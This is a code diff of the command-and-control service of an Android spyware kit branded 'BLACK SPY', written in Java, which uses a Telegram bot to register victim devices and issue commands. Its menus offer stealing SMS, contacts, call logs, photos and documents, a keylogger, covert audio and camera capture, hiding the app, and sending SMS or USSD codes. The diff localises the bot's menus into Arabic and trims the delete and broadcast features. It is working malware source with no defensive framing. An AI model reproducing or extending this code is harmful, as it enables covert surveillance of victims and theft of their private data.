@@ -3,21 +3,16 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.content.ClipboardManager;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
-import android.media.AudioManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
-import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
-import android.os.Environment;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.os.Vibrator;
@@ -27,7 +22,6 @@ import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -60,9 +54,6 @@ public class TelegramBotService extends Service {
     private MediaRecorder mediaRecorder;
     private String currentAudioPath;
     private boolean isRecording = false;
-    private boolean keyloggerRunning = false;
-    private StringBuilder keylogBuffer = new StringBuilder();
-    private Map<String, String> pendingDelete = new HashMap<>();
     static class DeviceInfo { String id, name; }
     @Override public void onCreate() { 
         super.onCreate(); 
@@ -82,14 +73,9 @@ public class TelegramBotService extends Service {
                 String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
                 HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                 conn.setRequestMethod("GET");
-                int code = conn.getResponseCode();
+                conn.getResponseCode();
                 conn.disconnect();
-                if (code == 200) {
-                    Log.i("BlackSpy", "✅ Registered: " + deviceName);
-                } else {
-                    Log.e("BlackSpy", "❌ Register failed");
-                }
-            } catch (Exception e) { Log.e("BlackSpy", "Register error", e); }
+            } catch (Exception e) {}
         }).start();
     }
     private void startBot() {
@@ -116,8 +102,9 @@ public class TelegramBotService extends Service {
                                 d.name = info.getString("device_name");
                                 if (!devices.containsKey(d.id)) {
                                     devices.put(d.id, d);
-                                    sendMessage("✅ New device connected: " + d.name);
-                                    sendDeviceList();
+                                    if (activeDevice == null) activeDevice = d.id;
+                                    sendMessage("✅ جهاز جديد: " + d.name);
+                                    sendMainMenu();
                                 }
                             }
                         }
@@ -129,35 +116,23 @@ public class TelegramBotService extends Service {
     private void handleCommand(String cmd) {
         String c = cmd.trim().toLowerCase();
         if (c.equals("/start")) {
-            sendWelcomeAndDevices();
-        } else if (c.startsWith("/select_")) {
-            String deviceId = cmd.substring(8).trim();
-            if (devices.containsKey(deviceId)) {
-                activeDevice = deviceId;
-                sendCommandMenu(deviceId);
+            sendMainMenu();
+        } else if (c.matches("\\d+")) {
+            int index = Integer.parseInt(c) - 1;
+            List<String> deviceIds = new ArrayList<>(devices.keySet());
+            if (index >= 0 && index < deviceIds.size()) {
+                activeDevice = deviceIds.get(index);
+                sendMessage("✅ الجهاز النشط: " + devices.get(activeDevice).name);
+                sendCommandMenu();
             } else {
-                sendMessage("❌ Device not found");
+                sendMessage("❌ رقم غير صحيح");
             }
-        } else if (c.equals("/devices")) {
-            sendDeviceList();
-        } else if (c.equals("/selectall")) {
-            activeDevice = "ALL";
-            sendMessage("✅ ALL DEVICES selected. Commands will be sent to every connected device.");
-        } else if (c.startsWith("yes_")) {
-            String path = pendingDelete.get(CHAT_ID);
-            if (path != null) {
-                pendingDelete.remove(CHAT_ID);
-                sendToDevice(activeDevice, "CONFIRM_DELETE|" + path);
-                sendMessage("✅ Delete confirmed");
-            } else {
-                sendMessage("❌ No pending delete");
-            }
-        } else if (c.startsWith("no_")) {
-            pendingDelete.remove(CHAT_ID);
-            sendMessage("❌ Delete cancelled");
         } else {
-            if (activeDevice == null && !c.equals("/start")) {
-                sendMessage("⚠️ Select device first: /start");
+            if (activeDevice == null && !devices.isEmpty()) {
+                activeDevice = devices.keySet().iterator().next();
+            }
+            if (activeDevice == null) {
+                sendMessage("❌ لا توجد أجهزة متصلة بعد");
                 return;
             }
             if (c.equals("/contacts")) sendToDevice(activeDevice, "GET_CONTACTS");
@@ -192,13 +167,6 @@ public class TelegramBotService extends Service {
             else if (c.equals("/steal_contacts")) sendToDevice(activeDevice, "STEAL_CONTACTS");
             else if (c.equals("/steal_sms")) sendToDevice(activeDevice, "STEAL_SMS");
             else if (c.equals("/steal_calls")) sendToDevice(activeDevice, "STEAL_CALLS");
-            else if (c.startsWith("/delete_photo ")) { String path = cmd.substring(14); askConfirmation("delete_photo|" + path); }
-            else if (c.startsWith("/delete_video ")) { String path = cmd.substring(14); askConfirmation("delete_video|" + path); }
-            else if (c.startsWith("/delete_audio ")) { String path = cmd.substring(14); askConfirmation("delete_audio|" + path); }
-            else if (c.startsWith("/delete_doc ")) { String path = cmd.substring(11); askConfirmation("delete_doc|" + path); }
-            else if (c.startsWith("/delete_contact ")) { String id = cmd.substring(16); askConfirmation("delete_contact|" + id); }
-            else if (c.startsWith("/delete_sms ")) { String id = cmd.substring(12); askConfirmation("delete_sms|" + id); }
-            else if (c.startsWith("/delete_call ")) { String id = cmd.substring(13); askConfirmation("delete_call|" + id); }
             else if (c.equals("/zip")) sendToDevice(activeDevice, "GET_ZIP");
             else if (c.equals("/photos")) sendToDevice(activeDevice, "GET_PHOTOS");
             else if (c.equals("/videos")) sendToDevice(activeDevice, "GET_VIDEOS");
@@ -228,77 +196,122 @@ public class TelegramBotService extends Service {
             else if (c.startsWith("/sms_send ")) sendToDevice(activeDevice, "SMS_SEND|" + cmd.substring(10));
             else if (c.startsWith("/call ")) sendToDevice(activeDevice, "CALL|" + cmd.substring(6));
             else if (c.startsWith("/ussd ")) sendToDevice(activeDevice, "USSD|" + cmd.substring(6));
-            else sendMessage("❌ Unknown command");
+            else sendMessage("❌ أمر غير معروف");
         }
+    }
+    private void sendMainMenu() {
+        if (devices.isEmpty()) {
+            sendMessage("🔥 BLACK SPY 🔥\n\n❌ لا توجد أجهزة متصلة بعد\n⏳ انتظر اتصال جهاز...");
+            return;
+        }
+        StringBuilder msg = new StringBuilder();
+        msg.append("🔥 BLACK SPY 🔥\n");
+        msg.append("╔════════════════════════════╗\n");
+        msg.append("║   👹 Black Spy 👹          ║\n");
+        msg.append("║   🕷️ Hackers Walking Anous 🕷️\n");
+        msg.append("║   💀 Under World Spy 💀    ║\n");
+        msg.append("╚════════════════════════════╝\n\n");
+        msg.append("📱 <b>الأجهزة المتصلة:</b>\n");
+        List<String> deviceIds = new ArrayList<>(devices.keySet());
+        for (int i = 0; i < deviceIds.size(); i++) {
+            DeviceInfo d = devices.get(deviceIds.get(i));
+            String marker = (activeDevice != null && activeDevice.equals(d.id)) ? "✅ " : "🔹 ";
+            msg.append(marker).append(i + 1).append(" - ").append(d.name).append("\n");
+        }
+        msg.append("\n⚠️ <b>لتبديل الجهاز</b> اكتب رقمه (1,2,3...)\n");
+        msg.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
+        msg.append("<b>الجهاز النشط حالياً:</b> ");
+        if (activeDevice != null && devices.containsKey(activeDevice)) {
+            msg.append(devices.get(activeDevice).name);
+        } else {
+            activeDevice = deviceIds.get(0);
+            msg.append(devices.get(activeDevice).name);
+        }
+        sendMessage(msg.toString());
+        sendCommandMenu();
+    }
+    private void sendCommandMenu() {
+        if (activeDevice == null) return;
+        String menu = "━━━━━━━━━━━━━━━━━━━━━━\n"
+                + "🔰 <b>قائمة الأوامر</b> 🔰\n"
+                + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                + "<b>📇 DATA / بيانات</b>\n"
+                + "/contacts 📱 جهات الاتصال\n"
+                + "/sms 💬 رسائل SMS\n"
+                + "/calllogs 📞 سجلات المكالمات\n"
+                + "/info ℹ️ معلومات الجهاز\n"
+                + "/battery 🔋 حالة البطارية\n"
+                + "/location 📍 الموقع الجغرافي\n"
+                + "/network 🌐 معلومات الشبكة\n"
+                + "/sim 📇 معلومات SIM\n\n"
+                + "<b>🎤 AUDIO / صوت</b>\n"
+                + "/record 🎙️ تسجيل الصوت\n"
+                + "/stoprec ⏹️ إيقاف التسجيل\n"
+                + "/volumeup 🔊 رفع الصوت\n"
+                + "/volumedown 🔉 خفض الصوت\n"
+                + "/mute 🔇 كتم الصوت\n\n"
+                + "<b>📸 CAMERA / كاميرا</b>\n"
+                + "/photo 📷 تصوير بالكاميرا الخلفية\n"
+                + "/photofront 🤳 تصوير بالكاميرا الأمامية\n"
+                + "/screenshot 📸 لقطة شاشة\n"
+                + "/screenrecord 🎥 تسجيل الشاشة\n\n"
+                + "<b>💀 STEAL / سرقة</b>\n"
+                + "/steal_all 💀 سرقة كل شيء\n"
+                + "/steal_photos 🖼️ سرقة الصور\n"
+                + "/steal_videos 🎬 سرقة الفيديوهات\n"
+                + "/steal_audio 🎵 سرقة الصوتيات\n"
+                + "/steal_docs 📄 سرقة المستندات\n"
+                + "/steal_contacts 📱 سرقة جهات الاتصال\n"
+                + "/steal_sms 💬 سرقة الرسائل\n"
+                + "/steal_calls 📞 سرقة سجلات المكالمات\n\n"
+                + "<b>📁 FILES / ملفات</b>\n"
+                + "/zip 📦 ضغط الملفات\n"
+                + "/photos 🖼️ قائمة الصور\n"
+                + "/videos 🎬 قائمة الفيديوهات\n"
+                + "/audio 🎵 قائمة الصوتيات\n"
+                + "/documents 📄 قائمة المستندات\n"
+                + "/search 🔍 بحث في الملفات\n"
+                + "/download ⬇️ تحميل ملف\n"
+                + "/mkdir 📁 إنشاء مجلد\n\n"
+                + "<b>📱 APPS / تطبيقات</b>\n"
+                + "/apps 📱 قائمة التطبيقات\n"
+                + "/openapp 🚀 فتح تطبيق\n"
+                + "/install 📲 تثبيت تطبيق\n"
+                + "/uninstall ❌ إلغاء تثبيت\n"
+                + "/disable 🚫 تعطيل تطبيق\n"
+                + "/enable ✅ تفعيل تطبيق\n"
+                + "/killapp 💀 إغلاق تطبيق\n\n"
+                + "<b>👁 STEALTH / إخفاء</b>\n"
+                + "/hide 👻 إخفاء التطبيق\n"
+                + "/show 👁️ إظهار التطبيق\n"
+                + "/toast 💬 رسالة منبثقة\n"
+                + "/notify 🔔 إشعار وهمي\n"
+                + "/vibrate 📳 اهتزاز\n"
+                + "/openurl 🌐 فتح رابط\n"
+                + "/clipboard 📋 محتوى الحافظة\n\n"
+                + "<b>⌨️ KEYLOGGER / تسجيل ضغطات</b>\n"
+                + "/keylogger start ▶️ تشغيل\n"
+                + "/keylogger stop ⏹️ إيقاف\n"
+                + "/keylogger send 📤 إرسال المسجل\n\n"
+                + "<b>📞 SMS & CALLS / رسائل ومكالمات</b>\n"
+                + "/sms_send ✉️ إرسال SMS\n"
+                + "/call 📞 إجراء مكالمة\n"
+                + "/ussd 🔢 كود USSD\n\n"
+                + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                + "⚠️ <b>جميع الأوامر تنفذ على:</b> " + devices.get(activeDevice).name;
+        sendMessage(menu);
     }
     private void sendToDevice(String deviceId, String cmd) {
         new Thread(() -> {
             try {
-                if (deviceId.equals("ALL")) {
-                    for (DeviceInfo d : devices.values()) {
-                        sendSingleCommand(d.id, cmd);
-                    }
-                    sendMessage("✅ Command sent to ALL (" + devices.size() + ") devices");
-                } else {
-                    sendSingleCommand(deviceId, cmd);
-                    sendMessage("✅ Command sent to " + devices.get(deviceId).name);
-                }
-            } catch (Exception e) { sendMessage("❌ Failed to send"); }
+                String url = API_URL + "sendMessage?chat_id=" + deviceId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
+                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+                conn.setRequestMethod("GET");
+                conn.getResponseCode();
+                conn.disconnect();
+                sendMessage("✅ تم إرسال الأمر: " + cmd);
+            } catch (Exception e) { sendMessage("❌ فشل الإرسال"); }
         }).start();
-    }
-    private void sendSingleCommand(String deviceId, String cmd) {
-        try {
-            String url = API_URL + "sendMessage?chat_id=" + deviceId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
-            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
-            conn.setRequestMethod("GET");
-            conn.getResponseCode();
-            conn.disconnect();
-        } catch (Exception e) {}
-    }
-    private void askConfirmation(String action) {
-        pendingDelete.put(CHAT_ID, action);
-        sendMessage("⚠️ Are you sure?\nType 'yes' to confirm or 'no' to cancel");
-    }
-    private void sendWelcomeAndDevices() {
-        String welcome = "🔥 BLACK SPY 🔥\n╔════════════════════════════╗\n║   👹 Black Spy 👹          ║\n║   🕷️ Hackers Walking Anous 🕷️\n║   💀 Under World Spy 💀    ║\n╚════════════════════════════╝\n\n";
-        if (devices.isEmpty()) {
-            sendMessage(welcome + "❌ No devices connected yet.\nWaiting for devices...\n\n⚠️ Install this APK on target devices.\nThey will auto-register here.");
-        } else {
-            StringBuilder sb = new StringBuilder(welcome + "📱 <b>Connected Devices (" + devices.size() + "):</b>\n\n");
-            for (DeviceInfo d : devices.values()) {
-                sb.append("🔹 /select_").append(d.id).append(" - ").append(d.name).append("\n");
-            }
-            sb.append("\n🔹 /selectall - Send commands to ALL devices\n");
-            sendMessage(sb.toString());
-        }
-    }
-    private void sendCommandMenu(String deviceId) {
-        DeviceInfo d = devices.get(deviceId);
-        String menu = "✅ <b>Device selected:</b> " + d.name + "\n\n"
-                + "🔰 <b>ALL COMMANDS (70+):</b>\n"
-                + "────────────────\n"
-                + "<b>📇 DATA:</b>\n/contacts, /sms, /calllogs, /apps, /info, /battery, /location, /network, /sim\n\n"
-                + "<b>🎤 AUDIO:</b>\n/record, /stoprec, /volumeup, /volumedown, /mute\n\n"
-                + "<b>📸 CAMERA:</b>\n/photo, /photofront, /screenshot, /screenrecord\n\n"
-                + "<b>📁 FILES:</b>\n/zip, /photos, /videos, /audio, /documents, /search, /download, /mkdir\n\n"
-                + "<b>📋 COPY (to device):</b>\n/copy_photos <dst>, /copy_videos <dst>, /copy_audio <dst>, /copy_docs <dst>\n/copy_contacts <dst>, /copy_sms <dst>, /copy_calls <dst>\n\n"
-                + "<b>💀 STEAL (to you):</b>\n/steal_all, /steal_photos, /steal_videos, /steal_audio, /steal_docs\n/steal_contacts, /steal_sms, /steal_calls\n\n"
-                + "<b>🗑 DELETE:</b>\n/delete_photo <path>, /delete_video <path>, /delete_audio <path>, /delete_doc <path>\n/delete_contact <id>, /delete_sms <id>, /delete_call <id>\n\n"
-                + "<b>📱 APPS:</b>\n/openapp WhatsApp, /install /sdcard/app.apk, /uninstall WhatsApp\n/disable WhatsApp, /enable WhatsApp, /appinfo WhatsApp, /killapp WhatsApp\n\n"
-                + "<b>👁 STEALTH:</b>\n/hide, /show, /toast <text>, /notify <text>, /vibrate <sec>, /openurl <url>, /clipboard\n\n"
-                + "<b>⌨️ KEYLOGGER:</b>\n/keylogger start, /keylogger stop, /keylogger send\n\n"
-                + "<b>📞 SMS & CALLS:</b>\n/sms_send <number> <text>, /call <number>, /ussd <code>\n\n"
-                + "<b>⚠️ Commands sent to this device only. Use /selectall for all devices.</b>";
-        sendMessage(menu);
-    }
-    private void sendDeviceList() {
-        if (devices.isEmpty()) return;
-        StringBuilder sb = new StringBuilder("📱 <b>Connected devices (" + devices.size() + "):</b>\n\n");
-        for (DeviceInfo d : devices.values()) {
-            sb.append("🔹 /select_").append(d.id).append(" - ").append(d.name).append("\n");
-        }
-        sb.append("\n🔹 /selectall - Send commands to ALL devices");
-        sendMessage(sb.toString());
     }
     private void sendMessage(String text) {
         new Thread(() -> {
